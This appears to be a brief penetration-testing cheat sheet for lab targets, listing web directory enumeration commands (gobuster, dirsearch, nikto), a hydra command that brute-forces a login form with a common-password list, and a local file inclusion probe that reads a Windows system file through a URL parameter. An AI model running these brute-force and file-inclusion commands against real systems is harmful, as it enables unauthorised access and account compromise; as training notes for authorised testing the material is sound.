## Enumeration

### Gobuster
```
gobuster dir -u https://10.11.1.35 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50

gobuster dir -u http://10.11.1.72 -w /usr/share/SecLists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e

```
### Dirsearch
https://github.com/maurosoria/dirsearch
```
python3 dirsearch.py -u <URL> -e <EXTENSION>

//search for txt files
python3 dirsearch.py -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -f -e txt    
```

### Nikto

```
nikto -h IP_ADDR
```

## Bruteforce

## Hydra

```
//Bruteforce login form (Invalid is the error message return when a wrong password is provided"
hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64 
```

### LOCAL FILE INCLUSION

when there is something like ```http://10.10.10.151/blog/?lang=blog-en.php```
if the host is Windows we can try to access this file in order to validate our findings:
```
10.10.10.151/blog/?lang=/windows/system32/license.rtf
```
